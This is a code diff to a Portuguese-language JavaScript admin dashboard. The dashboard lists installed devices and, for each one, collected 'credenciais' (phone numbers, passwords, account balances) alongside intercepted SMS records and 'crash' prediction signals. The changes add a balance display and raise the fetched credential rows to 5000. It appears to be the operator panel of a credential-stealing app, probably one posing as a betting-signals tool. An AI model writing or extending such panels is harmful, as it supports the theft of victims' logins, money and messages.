@@ -1180,7 +1180,7 @@ function renderLista(dispositivos, credenciais) {
         </div>
         <div class="cell hide-mobile" style="color:${desact?"#f97316":"var(--text)"}">${dev.versao || "—"}</div>
         <div class="cell hide-mobile">${formatDate(dev.ultimo_acesso)}</div>
-        <div class="cell hide-mobile">${devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||"—"}</div>
+        <div class="cell hide-mobile">${devCreds[0]?.numero||"—"}</div>
         <div style="display:flex;align-items:center;gap:8px;justify-content:flex-end">
           <span class="badge ${activo ? 'active' : 'idle'}">${activo ? 'ACTIVO' : 'INACTIVO'}</span>
           <span class="chevron">▼</span>
@@ -1203,8 +1203,8 @@ function renderLista(dispositivos, credenciais) {
               <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp||dev.created_at)}</span></div>
               <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val green">${formatDate(dev.ultimo_acesso)}</span></div>
               <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length?"red":""}">${devCreds.length} registos</span></div>
-              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||'—'}</span></div>
-              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||'—'}</span></div>
+              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds[0]?.numero||'—'}</span></div>
+              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds[0]?.senha||'—'}</span></div>
               <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo?"green":""}">${activo?"Activo hoje":"Inactivo"}</span></div>
             </div>
           </div>
@@ -1216,9 +1216,7 @@ function renderLista(dispositivos, credenciais) {
               <span class="sinais-resumo">${(()=>{const ss=sinaisPorDevice[dev.device_id]||[];const cr=ss.filter(s=>s.crashReal!=null);return cr.length?cr.length+" com resultado · taxa: "+Math.round(cr.filter(s=>s.alcOk).length/cr.length*100)+"%":ss.length?ss.length+" sinais":"carregando..."})()}</span>
             </span>
           </div>
-          <div class="device-sinais-container" data-device-id="${dev.device_id}" data-loaded="1">
-            <div class="device-sinais-container" data-device-id="${dev.device_id}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
-          </div>
+          <div class="device-sinais-container" data-device-id="${dev.device_id}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
 
           <div class="timeline-title" style="margin-top:16px">📋 Histórico de actividade</div>
           <div class="timeline">
@@ -1226,11 +1224,15 @@ function renderLista(dispositivos, credenciais) {
               ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem credenciais registadas</div>'
               : devCreds.map(c => `
                 <div class="tl-item">
-                  <div class="tl-dot ${getTipoDot(c.tipo)}"></div>
-                  <div class="tl-time">${formatDate(c.created_at)}</div>
+                  <div class="tl-dot ${c.numero ? 'numero' : c.senha ? 'senha' : 'login'}"></div>
+                  <div class="tl-time">${formatDate(c.criado_em||c.created_at)}</div>
                   <div class="tl-content">
-                    <div class="tipo">${getTipoLabel(c.tipo)}</div>
-                    <div>${c.numero?'📞 '+c.numero:''}${c.senha?' · 🔑 '+c.senha:''}${c.valor?c.valor:''}</div>
+                    <div class="tipo">🔑 Credencial</div>
+                    <div style="font-size:11px">
+                      ${c.numero ? '📞 <b>'+c.numero+'</b>' : ''}
+                      ${c.senha  ? ' · 🔒 '+c.senha : ''}
+                      ${c.saldo  ? ' · 💰 '+c.saldo : ''}
+                    </div>
                   </div>
                 </div>
               `).join('')
@@ -1439,7 +1441,7 @@ async function carregarDados() {
   try {
     const [r1,r2,r3] = await Promise.all([
       fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
-      fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=2000", {headers}),
+      fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=5000", {headers}),
       fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d2=await r2.json(), d3=await r3.json();
@@ -1490,7 +1492,7 @@ if (!autenticado) {
     try {
       const [r1,r2,r3] = await Promise.all([
         fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000",{headers}),
-        fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=2000",{headers}),
+        fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=5000",{headers}),
         fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers})
       ]);
       const d1=await r1.json(),d2=await r2.json(),d3=await r3.json();
